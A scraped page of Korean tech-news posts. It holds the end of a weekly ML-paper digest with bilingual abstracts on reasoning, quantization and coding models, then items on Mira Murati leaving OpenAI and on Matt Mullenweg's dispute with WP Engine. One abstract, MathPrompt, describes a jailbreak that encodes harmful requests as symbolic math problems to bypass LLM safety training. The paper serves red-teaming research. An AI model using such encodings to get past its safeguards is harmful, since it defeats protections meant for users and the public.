outperforming larger models of the same model size. We believe that the release of the Qwen2.5-Coder series will not only push the boundaries of research in code intelligence but also, through its permissive licensing, encourage
     broader adoption by developers in real-world applications.

    논문 링크

   https://arxiv.org/abs/2409.12186

    더 읽어보기

   https://x.com/huybery/status/1837170643563073960


  생각의 다이어그램(DoT)에서 / On the Diagram of Thought

    논문 소개

   수학적 엄밀성을 통해 LLM의 추론 능력을 향상시키고, DAT는 LLM의 반복 추론을 방향성 비순환 그래프의 구성으로 모델링하며, 명제, 비판, 개선 및 검증을 통합된 DAG 구조로 통합하여 선형 또는 트리 기반 접근 방식을 넘어 복잡한 논리적 추론을 포착할 수 있도록 합니다.

     Enhances the reasoning capabilities of LLMs through mathematical rigor; DAT models iterative reasoning in LLM as the construction of a directed acyclic graph; it integrates propositions, critiques, refinement, and verification into a unified DAG structure; this allows DoT to capture complex logical deduction beyond linear or tree-based approaches.

    논문 초록(Abstract)

   대규모 언어 모델(LLM)에서 반복 추론을 단일 모델 내에서 방향성 비순환 그래프(DAG)의 구성으로 모델링하는 프레임워크인 생각의 도표(DoT)를 소개합니다. 추론을 선형 체인이나 트리로 표현하는 기존 접근 방식과 달리 DoT는 명제, 비판, 개선, 검증을 응집력 있는 DAG 구조로 구성하여 모델이 논리적 일관성을 유지하면서 복잡한 추론 경로를 탐색할 수 있도록 합니다. 다이어그램의 각 노드는 제안, 비평, 개선 또는 검증된 명제에 해당하며, 자연어 피드백을 통해 LLM이 추론을 반복적으로 개선할 수 있도록 합니다. 역할별 토큰으로 자동 회귀적 다음 토큰 예측을 활용함으로써 DoT는 아이디어 제안과 비판적 평가 사이의 원활한 전환을 촉진하여 이진 신호보다 더 풍부한 피드백을 제공합니다. 또한 토포스 이론을 사용하여 DoT 프레임워크를 공식화하여 추론
   과정에서 논리적 일관성과 건전성을 보장하는 수학적 토대를 제공합니다. 이 접근 방식은 단일 LLM 내에서 훈련과 추론 프로세스를 모두 향상시켜 여러 모델이나 외부 제어 메커니즘이 필요하지 않습니다. DoT는 훈련 효율성, 강력한 추론 기능, 이론적 근거를 강조하는 차세대 추론 전문 모델을 설계하기 위한 개념적 프레임워크를 제공합니다. 코드는 https://github.com/diagram-of-thought/diagram-of-thought 에서 확인할 수 있습니다.

     We introduce Diagram of Thought (DoT), a framework that models iterative reasoning in large language models (LLMs) as the construction of a directed acyclic graph (DAG) within a single model. Unlike traditional approaches that represent reasoning as linear chains or trees, DoT organizes propositions, critiques, refinements, and verifications into a cohesive DAG structure, allowing the model to explore complex reasoning pathways while maintaining logical consistency. Each node in the diagram corresponds to a proposition that has been proposed, critiqued, refined, or verified, enabling the LLM to iteratively improve its reasoning through natural language feedback. By leveraging auto-regressive next-token prediction with role-specific tokens, DoT facilitates seamless transitions between proposing ideas and critically evaluating them, providing richer feedback than binary signals. Furthermore, we formalize the DoT framework using Topos Theory, providing a mathematical
     foundation that ensures logical consistency and soundness in the reasoning process. This approach enhances both the training and inference processes within a single LLM, eliminating the need for multiple models or external control mechanisms. DoT offers a conceptual framework for designing next-generation reasoning-specialized models, emphasizing training efficiency, robust reasoning capabilities, and theoretical grounding. The code is available at https://github.com/diagram-of-thought/diagram-of-thought.

    논문 링크

   https://arxiv.org/abs/2409.10038

    더 읽어보기

   https://github.com/diagram-of-thought/diagram-of-thought

   https://x.com/omarsar0/status/1835882277563179512


  소프트웨어 엔지니어링 에이전트: 설문조사, 현황 및 비전 / Agents in Software Engineering: Survey, Landscape, and Vision

    논문 소개

   소프트웨어 엔지니어링에서 LLM 기반 에이전트의 프레임워크에 대한 포괄적인 개요를 제공합니다.

     Provides a comprehensive overview of frameworks of LLM-based agents in software engineering.

    논문 초록(Abstract)

   최근 몇 년 동안 대규모 언어 모델(LLM)은 괄목할 만한 성공을 거두며 다양한 다운스트림 작업, 특히 소프트웨어 엔지니어링(SE) 분야의 작업에서 널리 사용되고 있습니다. LLM과 SE를 결합한 많은 연구에서 에이전트 개념을 명시적으로 또는 암시적으로 사용하고 있습니다. 그러나 기존 작품들의 개발 맥락을 정리하고, 기존 작품들이 어떻게 LLM 기반 에이전트 기술을 결합하여 다양한 작업을 최적화하고 있는지 분석하고, SE에서 LLM 기반 에이전트의 프레임워크를 명확히 하는 심층적인 조사는 부족한 실정입니다. 본 논문에서는 LLM 기반 에이전트와 SE의 결합에 대한 연구를 최초로 조사하고, 지각, 기억, 행동의 세 가지 핵심 모듈을 포함하는 SE에서의 LLM 기반 에이전트의 프레임워크를 제시합니다. 또한 두 분야를 결합하는 데 있어 현재 직면한 과제를 요약하고
   기존 과제에 대응하여 향후 기회를 제안합니다. 관련 논문의 GitHub 리포지토리는 https://github.com/DeepSoftwareAnalytics/Awesome-Agent4SE 에서 확인할 수 있습니다.

     In recent years, Large Language Models (LLMs) have achieved remarkable success and have been widely used in various downstream tasks, especially in the tasks of the software engineering (SE) field. We find that many studies combining LLMs with SE have employed the concept of agents either explicitly or implicitly. However, there is a lack of an in-depth survey to sort out the development context of existing works, analyze how existing works combine the LLM-based agent technologies to optimize various tasks, and clarify the framework of LLM-based agents in SE. In this paper, we conduct the first survey of the studies on combining LLM-based agents with SE and present a framework of LLM-based agents in SE which includes three key modules: perception, memory, and action. We also summarize the current challenges in combining the two fields and propose future opportunities in response to existing challenges. We maintain a GitHub repository of the related papers at:
     https://github.com/DeepSoftwareAnalytics/Awesome-Agent4SE.

    논문 링크

   https://arxiv.org/abs/2409.09030

    더 읽어보기

   https://github.com/DeepSoftwareAnalytics/Awesome-Agent4SE

   https://x.com/omarsar0/status/1835705359723319702


  CoT를 할 것인가, 말 것인가? 연쇄 사고는 주로 수학과 상징적 추론에 도움이 됩니다 / To CoT or not to CoT? Chain-of-thought helps mainly on math and symbolic reasoning

    논문 소개

   100개 이상의 논문과 여러 평가에 대한 메타분석을 통해 어떤 종류의 작업이 생각의 사슬(CoT) 프롬프트의 혜택을 가장 많이 받는지 조사한 결과, CoT는 주로 수학 및 논리와 관련된 작업에서 강력한 성능 이점을 제공한다는 사실을 발견했으며, 대부분의 CoT 이점은 기호적 실행 개선에서 비롯되지만 기호적 솔버가 그보다 더 뛰어난 성능을 발휘한다는 사실을 밝혀냈습니다.

     Investigates what kinds of tasks benefit the most from chain-of-thought (CoT) prompting; after a meta-analysis on 100+ papers and several evaluations, it finds that CoT produces strong performance benefits primarily on tasks involving math and logic; they find that most of the CoT gain comes from improving symbolic execution, but a symbolic solver outperforms it.

    논문 초록(Abstract)

   프롬프트를 통한 생각의 연쇄(CoT)는 대규모 언어 모델(LLM)에서 추론 능력을 이끌어내는 사실상 유일한 방법입니다. 하지만 이 추가적인 '사고'가 어떤 종류의 작업에 실제로 도움이 될까요? 이를 분석하기 위해 CoT를 사용한 100개 이상의 논문을 대상으로 정량적 메타 분석을 수행하고 14개 모델에 걸쳐 20개 데이터 세트에 대한 자체 평가를 실행했습니다. 그 결과, CoT는 주로 수학이나 논리와 관련된 작업에서 강력한 성능 이점을 제공하며 다른 유형의 작업에서는 훨씬 적은 이점을 제공하는 것으로 나타났습니다. MMLU에서는 질문이나 모델의 답변에 기호 연산과 추론을 나타내는 등호가 포함되지 않는 한 CoT 없이 직접 답을 생성하는 것이 CoT와 거의 동일한 정확도로 이어집니다. 이 결과에 따라 계획과 실행을 분리하고 도구 증강 LLM과 비교하여 이러한 문제에
   대한 CoT의 동작을 분석합니다. CoT의 이점은 대부분 기호적 실행의 개선에서 비롯되지만, 기호적 솔버를 사용하는 것에 비해서는 성능이 떨어집니다. 연구 결과는 CoT를 선택적으로 적용하여 성능을 유지하면서 추론 비용을 절감할 수 있음을 보여줍니다. 또한 프롬프트 기반 CoT를 넘어 전체 LLM 애플리케이션에 걸쳐 중간 계산을 더 잘 활용하는 새로운 패러다임으로 전환해야 할 필요성을 시사합니다.

     Chain-of-thought (CoT) via prompting is the de facto method for eliciting reasoning capabilities from large language models (LLMs). But for what kinds of tasks is this extra ``thinking'' really helpful? To analyze this, we conducted a quantitative meta-analysis covering over 100 papers using CoT and ran our own evaluations of 20 datasets across 14 models. Our results show that CoT gives strong performance benefits primarily on tasks involving math or logic, with much smaller gains on other types of tasks. On MMLU, directly generating the answer without CoT leads to almost identical accuracy as CoT unless the question or model's response contains an equals sign, indicating symbolic operations and reasoning. Following this finding, we analyze the behavior of CoT on these problems by separating planning and execution and comparing against tool-augmented LLMs. Much of CoT's gain comes from improving symbolic execution, but it underperforms relative to using a symbolic solver.
     Our results indicate that CoT can be applied selectively, maintaining performance while saving inference costs. Furthermore, they suggest a need to move beyond prompt-based CoT to new paradigms that better leverage intermediate computation across the whole range of LLM applications.

    논문 링크

   https://arxiv.org/abs/2409.12183

    더 읽어보기

   https://x.com/omarsar0/status/1836599280477299013


  정량화된 명령어 조정 대규모 언어 모델에 대한 종합적인 평가: 최대 405B까지의 실험적 분석 / A Comprehensive Evaluation of Quantized Instruction-Tuned Large Language Models: An Experimental Analysis up to 405B

    논문 소개

   7B에서 405B에 이르는 모델에서 다양한 양자화 방법에 걸쳐 인스트럭션 튜닝 LLM의 성능을 평가한 결과, 1) 더 큰 LLM을 더 작은 FP16 LLM과 비슷한 크기로 양자화하는 것이 일반적으로 대부분의 벤치마크에서 더 나은 성능을 발휘하고, 2) 성능은 양자화 방법, 모델 크기, 비트 폭에 따라 크게 달라지며, 가중치 전용 방법이 더 큰 모델에서 종종 좋은 결과를 내고, 3) 작업 난이도는 양자화로 인한 정확도 저하에는 큰 영향을 주지 않는다는 것을 발견할 수 있습니다.

     Evaluates the performance of instruction-tuned LLMs across various quantization methods on models ranging from 7B to 405B; the key findings are 1) quantizing a larger LLM to a similar size as a smaller FP16 LLM generally performs better across most benchmarks, 2) performance varies significantly with different quantization methods, model size, and bit-width, with weight-only methods often yielding better results in larger models, and 3) task difficulty does not significantly impact accuracy degradation due to quantization.

    논문 초록(Abstract)

   이전 연구에서는 난해성이나 몇 가지 기본 지식 작업, 오래된 데이터 세트와 같은 제한된 지표를 사용해 정량화된 LLM을 평가했습니다. 또한, 최대 405B에 달하는 Llama 3.1과 같은 최근의 대규모 모델은 철저하게 검증되지 않았습니다. 이 백서에서는 7B에서 405B에 이르는 모델에서 다양한 양자화 방법(GPTQ, AWQ, SmoothQuant, FP8)에 걸쳐 명령어 튜닝된 LLM의 성능을 평가합니다. 13개의 벤치마크를 사용하여 상식적인 질의응답, 지식 및 언어 이해, 지시 사항 따라하기, 환각 감지, 수학, 대화 등 6가지 작업 유형에 대한 성능을 평가했습니다. 주요 연구 결과는 (1) 더 큰 LLM을 더 작은 FP16 LLM과 비슷한 크기로 양자화하는 것이 일반적으로 환각 감지와 명령어 추종을 제외한 대부분의 벤치마크에서 더 나은 성능을 보인다는 점, (2) 성능은 양자화 방법, 모델 크기, 비트 폭에 따라
   크게 달라지며, 가중치 전용 방법이 더 큰 모델에서 더 나은 결과를 내는 경우가 많다는 점, (3) 과제 난이도는 양자화로 인한 정확도 저하에 큰 영향을 주지 않는다는 점, MT-Bench 평가 방법은 최근 고성능 LLM 간의 변별력에 한계가 있었다는 점 등을 밝혀냈습니다.

     Prior research works have evaluated quantized LLMs using limited metrics such as perplexity or a few basic knowledge tasks and old datasets. Additionally, recent large-scale models such as Llama 3.1 with up to 405B have not been thoroughly examined. This paper evaluates the performance of instruction-tuned LLMs across various quantization methods (GPTQ, AWQ, SmoothQuant, and FP8) on models ranging from 7B to 405B. Using 13 benchmarks, we assess performance across six task types: commonsense Q&A, knowledge and language understanding, instruction following, hallucination detection, mathematics, and dialogue. Our key findings reveal that (1) quantizing a larger LLM to a similar size as a smaller FP16 LLM generally performs better across most benchmarks, except for hallucination detection and instruction following; (2) performance varies significantly with different quantization methods, model size, and bit-width, with weight-only methods often yielding better results in larger
     models; (3) task difficulty does not significantly impact accuracy degradation due to quantization; and (4) the MT-Bench evaluation method has limited discriminatory power among recent high-performing LLMs.

    논문 링크

   https://arxiv.org/abs/2409.11055

    더 읽어보기

   https://x.com/omarsar0/status/1836479309390995790


  생각의 반복: 자율적인 대규모 언어 모델 추론을 위한 내부 대화 활용하기 / Iteration of Thought: Leveraging Inner Dialogue for Autonomous Large Language Model Reasoning

    논문 소개

   적응형 추론 경로로 LLM 응답 및 추론 기능을 향상시키기 위해 생각의 반복(IoT) 프레임워크를 제안하며, 가이드 역할을 하는 내부 대화 에이전트를 활용하여 추론 경로를 동적으로 조정함으로써 적응형 교차 경로 탐색을 가능하게 하고 응답 정확도를 향상시키며, 프롬프트 생성은 적응이 가능한 동적 프로세스라는 점에서 CoT 및 ToT(모두 고정된 프로세스)와는 차이가 있습니다.

     Proposes the Iteration of Thought (IoT) framework to enhance the LLM responses and reasoning capabilities with adaptive reasoning paths; it leverages an inner dialogue agent, acting as a guide, to dynamically adjust reasoning paths which allows adaptive cross-path exploration and enhance response accuracy; it's different from CoT and ToT (both rigid processes) in that its prompt generation is a dynamic process that allows it to adapt.

    논문 초록(Abstract)

   반복적인 인간 참여는 대규모 언어 모델(LLM)의 고급 언어 처리 능력을 활용할 수 있는 일반적이고 효과적인 수단입니다. 잘 구조화된 대화형 프롬프트를 사용하면 인간 사용자는 보다 사려 깊고 정확한 응답을 개발하도록 LLM에 효과적으로 영향을 미칠 수 있습니다. 이러한 인사이트에서 영감을 얻어, 입력 쿼리와 현재 LLM의 응답 반복에 대해 '생각'을 자극하는 프롬프트를 생성함으로써 LLM 응답을 개선하기 위한 생각의 반복(IoT) 프레임워크를 제안합니다. 정적 또는 반정적 접근 방식(예: 생각의 사슬(CoT) 또는 생각의 나무(ToT))과 달리 IoT는 진화하는 상황에 따라 추론 경로를 동적으로 조정하고 궁극적으로 버려지는 대체 탐색적 사고를 생성하지 않습니다. IoT 프레임워크의 세 가지 구성 요소는 (1) 유익한 상황별 프롬프트를 생성하는 IDA(내부 대화 에이전트),
   (2) 이러한 프롬프트를 처리하여 응답을 구체화하는 LLMA(LLM 에이전트), (3) 앞의 두 요소 간의 대화를 구현하는 반복적인 프롬프트 루프입니다. 이 프레임워크의 두 가지 변형을 소개합니다: LLM이 반복을 중단할 시점을 결정하는 자율 반복(AIoT)과 항상 고정된 횟수의 반복을 강제하는 유도 반복(GIoT)이 그것입니다. GPQA 데이터 세트의 복잡한 추론 작업, Game of 24의 탐색적 문제 해결, 미니 크로스워드의 퍼즐 풀이, HotpotQA 데이터 세트의 멀티홉 질문 답변 등 다양한 데이터 세트에서 IoT의 성능을 조사합니다. 연구 결과에 따르면 IoT는 LLM의 자율적 응답 개선을 위한 실행 가능한 패러다임으로, CoT에 비해 상당한 개선을 보여줌으로써 사람의 개입을 최소화하는 보다 적응적이고 효율적인 추론 시스템을 구현할 수 있음을 보여줍니다.

     Iterative human engagement is a common and effective means of leveraging the advanced language processing power of large language models (LLMs). Using well-structured prompts in a conversational manner, human users can effectively influence an LLM to develop more thoughtful and accurate responses. Motivated by this insight, we propose the Iteration of Thought (IoT) framework for enhancing LLM responses by generating ""thought""-provoking prompts vis a vis an input query and the current iteration of an LLM's response. Unlike static or semi-static approaches, e.g. Chain of Thought (CoT) or Tree of Thoughts (ToT), IoT adapts its reasoning path dynamically, based on evolving context, and without generating alternate explorative thoughts which are ultimately discarded. The three components of the IoT framework are (1) an Inner Dialogue Agent (IDA) responsible for generating instructive, context-specific prompts; (2) an LLM Agent (LLMA) that processes these prompts to refine its
     responses; and (3) an iterative prompting loop that implements a conversation between the former two components. We introduce two variants of our framework: Autonomous Iteration of Thought (AIoT), where an LLM decides when to stop iterating, and Guided Iteration of Thought (GIoT), which always forces a fixed number iterations. We investigate the performance of IoT across various datasets, spanning complex reasoning tasks from the GPQA dataset, explorative problem-solving in Game of 24, puzzle solving in Mini Crosswords, and multi-hop question answering from the HotpotQA dataset. Our results show that IoT represents a viable paradigm for autonomous response refinement in LLMs, showcasing significant improvements over CoT and thereby enabling more adaptive and efficient reasoning systems that minimize human intervention.

    논문 링크

   https://arxiv.org/abs/2409.12618

    더 읽어보기

   https://x.com/omarsar0/status/1836977595847692671


  슈뢰딩거의 기억: 대규모 언어 모델 / Schrodinger's Memory: Large Language Models

    논문 소개

   범용 근사 정리를 사용해 LLM의 메모리 메커니즘을 설명합니다. 또한 다양한 모델의 메모리 용량을 비교하여 LLM 성능을 평가하는 새로운 접근 방식을 제안하고, 트랜스포머 아키텍처는 입력을 적응적으로 맞추는 강력한 기능을 갖춘 동적 맞춤 UAT 모델로 작동하여 최소한의 입력 정보로 전체 콘텐츠를 리콜할 수 있습니다.

     Uses the Universal Approximation Theorem to explain the memory mechanism of LLMs. It also proposes a new approach to evaluate LLM performance by comparing the memory capacities of different models; the Transformer architecture functions as a dynamic fitting UAT model, with a strong ability to adaptively fit inputs; this enables LLMs to recall entire content based on minimal input information.

    논문 초록(Abstract)

   기억은 모든 인간 활동의 기초이며, 기억이 없다면 일상 생활에서 어떤 일을 수행하는 것은 거의 불가능할 것입니다. 대규모 언어 모델(LLM)의 발전으로 언어 능력은 점점 인간과 비슷해지고 있습니다. 하지만 LLM에도 메모리가 있을까요? 현재의 성능으로 볼 때 LLM은 기억력을 가지고 있는 것으로 보입니다. 그렇다면 이러한 기억의 기본 메커니즘은 무엇일까요? 이전 연구에서는 LLM의 기억 능력과 그 기반이 되는 이론에 대한 심층적인 탐구가 부족했습니다. 이 논문에서는 범용 근사 정리(UAT)를 사용해 LLM의 메모리 메커니즘을 설명합니다. 또한 다양한 LLM의 메모리 능력을 검증하기 위한 실험을 수행하여 이러한 메모리 능력을 기반으로 능력을 평가하는 새로운 방법을 제안합니다. 우리는 LLM 메모리가 슈뢰딩거의 메모리처럼 작동하여 특정 메모리를 쿼리할
   때만 관찰할 수 있다고 주장합니다. 쿼리에 대한 응답으로 모델이 메모리를 보유하고 있는지 여부만 확인할 수 있으며, 그렇지 않으면 불확실한 상태로 남아 있습니다. 마지막으로, 인간 두뇌와 LLM의 기억 능력을 비교하여 작동 메커니즘의 유사점과 차이점을 강조함으로써 이 개념을 확장합니다.

     Memory is the foundation of all human activities; without memory, it would be nearly impossible for people to perform any task in daily life. With the development of Large Language Models (LLMs), their language capabilities are becoming increasingly comparable to those of humans. But do LLMs have memory? Based on current performance, LLMs do appear to exhibit memory. So, what is the underlying mechanism of this memory? Previous research has lacked a deep exploration of LLMs' memory capabilities and the underlying theory. In this paper, we use Universal Approximation Theorem (UAT) to explain the memory mechanism in LLMs. We also conduct experiments to verify the memory capabilities of various LLMs, proposing a new method to assess their abilities based on these memory ability. We argue that LLM memory operates like Schr""odinger's memory, meaning that it only becomes observable when a specific memory is queried. We can only determine if the model retains a memory based on its
     output in response to the query; otherwise, it remains indeterminate. Finally, we expand on this concept by comparing the memory capabilities of the human brain and LLMs, highlighting the similarities and differences in their operational mechanisms.

    논문 링크

   https://arxiv.org/abs/2409.10482

    더 읽어보기

   https://x.com/omarsar0/status/1835882330323554321


  기호 수학으로 대규모 언어 모델 탈옥하기 / Jailbreaking Large Language Models with Symbolic Mathematics

    논문 소개

   효과적인 탈옥 기법으로 사용되는 수학적으로 인코딩된 프롬프트를 생성하기 위해 GPT-4o를 사용하며, 13개의 최첨단 장비에서 평균 73.6%의 공격 성공률을 보여 기존의 안전 훈련 메커니즘이 수학적으로 인코딩된 입력에 일반화할 수 없음을 강조합니다.

     Uses GPT-4o to generate mathematically encoded prompts that serve as an effective jailbreaking technique; shows an average attack success rate of 73.6% across 13 state-of-the-art; this highlights the inability of existing safety training mechanisms to generalize to mathematically encoded inputs.

    논문 초록(Abstract)

   최근 AI 안전성의 발전으로 인해 안전하지 않은 콘텐츠 생성을 완화하기 위해 대규모 언어 모델(LLM)을 학습하고 레드팀화하는 노력이 증가하고 있습니다. 그러나 이러한 안전 메커니즘은 포괄적이지 않아 잠재적인 취약점을 발견하지 못할 수 있습니다. 이 백서에서는 LLM의 고급 기호 수학 기능을 악용하여 안전 메커니즘을 우회하는 새로운 탈옥 기법인 MathPrompt를 소개합니다. 유해한 자연어 프롬프트를 수학 문제로 인코딩함으로써 현재 AI 안전 조치의 심각한 취약점을 보여줍니다. 13개의 최신 LLM에 대한 실험 결과, 평균 공격 성공률이 73.6%에 달해 기존의 안전 훈련 메커니즘이 수학적으로 인코딩된 입력에 일반화할 수 없음을 보여주었습니다. 임베딩 벡터를 분석한 결과, 원본 프롬프트와 인코딩된 프롬프트 사이에 상당한 의미적 변화가 있는 것으로 나타나
   공격의 성공을 설명하는 데 도움이 됩니다. 이 연구는 AI 안전에 대한 총체적인 접근 방식의 중요성을 강조하며, 모든 잠재적 입력 유형과 관련 위험에 대해 강력한 안전장치를 개발하기 위한 레드팀 노력을 확대할 것을 촉구합니다.

     Recent advancements in AI safety have led to increased efforts in training and red-teaming large language models (LLMs) to mitigate unsafe content generation. However, these safety mechanisms may not be comprehensive, leaving potential vulnerabilities unexplored. This paper introduces MathPrompt, a novel jailbreaking technique that exploits LLMs' advanced capabilities in symbolic mathematics to bypass their safety mechanisms. By encoding harmful natural language prompts into mathematical problems, we demonstrate a critical vulnerability in current AI safety measures. Our experiments across 13 state-of-the-art LLMs reveal an average attack success rate of 73.6%, highlighting the inability of existing safety training mechanisms to generalize to mathematically encoded inputs. Analysis of embedding vectors shows a substantial semantic shift between original and encoded prompts, helping explain the attack's success. This work emphasizes the importance of a holistic approach to
     AI safety, calling for expanded red-teaming efforts to develop robust safeguards across all potential input types and their associated risks.

    논문 링크

   https://arxiv.org/abs/2409.11445

    더 읽어보기

   https://x.com/omarsar0/status/1836603922405806501


  원문

   https://nlp.elvissaravia.com/p/top-ml-papers-of-the-week-277


     * 이 글은 GPT 모델로 정리한 것으로, 잘못된 부분이 있을 수 있으니 글 아래쪽의 원문도 함께 참고해주세요! 읽으시면서 어색하거나 잘못된 내용을 발견하시면 덧글로 알려주시기를 부탁드립니다.* 🤗

   ⚠️광고⚠️: 🔥파이토치 한국 사용자 모임🇰🇷이 정리한 이 글이 유용하셨나요? 회원으로 가입하시면 주요 글들을 이메일💌로 보내드립니다! (기본은 Weekly지만 Daily로 변경도 가능합니다.)

   제목은 6월이고 링크된 게시물은 9월입니다. 자동완성 때문에 이렇게 된걸까요

   헉, 그러네요;;; 알려주셔서 감사합니다. T_T
   제목을 '[2024/09/16 ~ 09/22] 이번 주의 주요 ML 논문 (Top ML Papers of the Week)' 으로 해야 하는데 템플릿을 사용하다가 실수했습니다. xguru님 혹시 보시게 되면 변경 부탁드립니다. 🙇‍♂️

   감사합니다!!
"
"https://news.hada.io/topic?id=16931","OpenAI의 공동 창립자이자 현 CTO 미라 무라티, 퇴사","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   OpenAI의 공동 창립자이자 현 CTO 미라 무라티, 퇴사

   퇴사전 직원들에게 공유한 이메일 내용

     안녕하세요,
     여러분과 나누고 싶은 이야기가 있습니다. 많은 고민 끝에, 저는 OpenAI를 떠나기로 어렵지만 결단을 내렸습니다.
     OpenAI 팀과 함께한 지난 6년 반은 정말로 큰 특권이었습니다. 앞으로 여러 사람들에게 감사 인사를 전할 예정이지만, 먼저 저를 기술 조직의 리더로 신뢰해주고 수년간 지원해준 Sam과 Greg에게 감사를 표하고 싶습니다.

     사랑하는 곳을 떠나는 데 적절한 시기는 없지만, 지금이 적기라고 느낍니다. 최근 출시된 음성-음성 및 OpenAI o1은 상호작용과 지능의 새로운 시대를 여는 시작점입니다. 이는 여러분의 창의성과 뛰어난 기술 덕분에 가능했습니다. 우리는 단지 더 스마트한 모델을 만들지 않았고, AI 시스템이 복잡한 문제를 학습하고 추론하는 방식을 근본적으로 변화시켰습니다. 우리는 이론적 연구에 그쳤던 안전성 연구를 실질적 응용으로 옮겨, 이전보다 더 견고하고, 정렬되고, 조작 가능한 모델을 만들었습니다. 우리의 작업은 최첨단 AI 연구를 직관적이고 접근 가능하게 만들어, 모든 사람의 입력에 따라 적응하고 발전하는 기술을 개발해왔습니다. 이 성공은 탁월한 팀워크 덕분이며, 여러분의 탁월함, 헌신, 그리고 열정 덕분에 OpenAI가 AI 혁신의 정점에 설 수 있었습니다.

     저는 저만의 탐구를 할 시간과 공간을 만들기 위해 떠나는 것입니다. 당분간은 우리가 쌓아온 모멘텀을 유지하며, 원활한 전환을 위해 최선을 다하는 것이 제 주요 목표입니다.

     이 놀라운 팀과 함께 일하고 발전할 수 있는 기회를 얻게 된 것에 영원히 감사할 것입니다. 함께 우리는 과학적 이해의 경계를 넓히며 인류의 복지를 향상시키려 노력했습니다. 비록 이제는 여러분과 함께하지 않겠지만, 저는 여전히 여러분을 응원할 것입니다.

     우리가 함께 쌓아온 우정, 이뤄낸 승리, 그리고 무엇보다 함께 극복한 도전에 대해 깊은 감사의 마음을 담아.
     Mira

   몇년 안에 agi 가 될까?

        Hacker News 의견

     * ""몇 년 안에 세계를 바꿀 AGI를 만들 회사""와 ""내 일을 하기 위해 떠난다""는 말을 이해하기 어려움
     * OpenAI의 PR 팀이 Sam과 이사회 지시에 따라 작성한 편지임
     * 실제 이야기는 NDA와 주식 회수 위협 등 여러 층 아래에 숨겨져 있음
     * 그녀의 위치에 있는 어떤 임원도 자발적으로 사임하지 않음
     * 관련 소식: OpenAI가 비영리 통제를 제거하고 Sam Altman에게 지분을 줄 예정임
     * 업데이트: GPT-4의 공동 리더인 Barret Zoph도 떠남
     * OpenAI가 AGI 해결의 선두주자라면, 사람들이 떠나는 것이 이상함
     * 장기적으로 Sam과 일하고 싶지 않은 것처럼 보임
     * ""AI 시스템이 복잡한 문제를 학습하고 추론하는 방식을 근본적으로 바꾸었다""는 주장에 의문을 가짐
     * ChatGPT는 Google의 연구를 기반으로 했으며, 2021년 Google의 내부 챗봇이 더 나았다고 생각함
     * OpenAI가 중요한 연구를 했다고 믿고 싶지만, 구체적인 기여를 알고 싶음
     * 이 사람들이 자신의 스타트업을 위해 20-100M을 모을 수 있을 것이라고 생각함
     * OpenAI가 기업화되고 있음
     * 댓글에 많은 추측이 있음
     * 6년 동안 OpenAI에 있었고, AI 회사들이 많기 때문에 다른 기회를 찾을 것임
     * 이 메시지 스타일로 실제 대화하는 사람은 거의 없음
     * 약속의 크기와 비즈니스 모델의 모호성 사이의 차이가 외부 힘을 활용해 회사 방향을 설정할 필요성과 이점을 만듦
     * Sam Altman의 중동 투자자 유치 시도가 성공하길 바람
     * Sam이 OpenAI의 소유자가 아니더라도, 결국 OpenAI가 무엇이 되든 그가 소유할 것임
     * Sam이 현재의 혼란에서 통제권을 잃으면, 그의 후임자가 더 나쁠 것임
     * 모두에게 행운을 빔
"
"https://news.hada.io/topic?id=16891","WP Engine은 Wordpress가 아닙니다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       WP Engine은 Wordpress가 아닙니다

     * 워드프레스를 만들고 운영하는 Automattic 의 CEO, Matt Mullenweg이 작성한 글
     * WP Engine은 WordPress의 공식적인 일부가 아님
     * WP Engine의 브랜딩, 마케팅, 광고는 WordPress를 제공한다고 주장하지만, 실제로는 그렇지 않음
     * 이로 인해 사용자들이 혼란을 겪고 있으며, WP Engine은 이를 통해 이익을 얻고 있음
     * Matt는 Silver Lake의 Lee Wittlinger가 오픈 소스 커뮤니티를 어떻게 약화시키는지에 대해 발표했음
          + Silver Lake는 WordPress를 통해 약 5억 달러의 수익을 올리지만, 주당 40시간만 기여
          + Automattic은 비슷한 규모의 수익을 내지만 주당 3,915시간 기여

WP Engine의 기술적 문제

     * WordPress는 콘텐츠 관리 시스템으로, 모든 변경 사항이 기록됨
          + 이 기록 시스템은 사용자가 실수를 되돌릴 수 있게 하며, 콘텐츠의 역사를 추적할 수 있게 함
     * WP Engine은 이 기록 시스템을 비활성화함
          + 이는 데이터베이스에 변경 기록을 저장하는 비용을 절감하기 위함
          + 사용자가 실수를 하면 콘텐츠를 복구할 수 없게 되어 WordPress의 핵심 약속을 깨뜨림
     * WP Engine은 150만 개의 WordPress 설치에서 기록 시스템을 비활성화한다고 명시함
          + 이는 사이트 속도를 저하시킨다는 이유를 대지만, 실제로는 데이터 저장 비용을 절감하기 위함
          + WordPress.org에서 추천하는 모든 호스트 중 WP Engine만이 기본적으로 기록 시스템을 비활성화함

WP Engine의 문제점

     * WP Engine은 WordPress를 변형하여 저렴한 모조품을 제공하고 더 많은 비용을 청구함
     * 이는 WordPress 생태계를 약화시키며, 다른 호스트들이 이를 따라할 위험이 있음
     * WordPress의 미래를 위해 더 높은 기준을 설정해야 함

고객의 권한

     * WP Engine의 고객이라면 지원팀에 연락하여 최소한 3개의 기록을 활성화하도록 요청해야 함
     * 이상적으로는 무제한 기록을 허용해야 함
     * 고객이 돈을 통해 힘을 가지고 있으며, 다른 WordPress 호스트를 고려해야 함

GN⁺의 정리

     * 이 글은 WP Engine이 WordPress의 핵심 기능을 비활성화하여 사용자 경험을 저하시킨다는 점을 강조함
     * WP Engine의 이러한 행동은 WordPress 생태계에 부정적인 영향을 미칠 수 있음
     * 사용자는 WP Engine 대신 다른 WordPress 호스트를 고려해야 함
     * 이 기사는 WordPress 사용자들에게 중요한 정보를 제공하며, WP Engine의 문제점을 알리는 데 도움이 됨
     * 비슷한 기능을 제공하는 다른 호스트로는 SiteGround, Bluehost 등이 있음

   WP Engine 창업자는 꽤 성공한 케이스로 알려져서 여러 글이 긱뉴스에 올라왔습니다. (글도 꽤 잘써요)
     * Product/Market Fit (PMF)을 위한 로드맵
     * ""실패""라고 말하지 마세요
     * 스타트업 성공 전략의 80%는 실수를 피하는 것
     * 어떻게 스타트업이 기존 기업들을 이길 수 있는가(How startups beat incumbents)

   근데 Matt Mullenweg은 그가 워드프레스로 돈을 벌면서 워드프레스 커뮤니티에 기여하지 않는게 별로 안좋게 보이나 봅니다.

   이 뒤로 다양한 일이 진행중입니다. 워드프레스 생태계 자체가 흔들리고 있네요. ㅠ

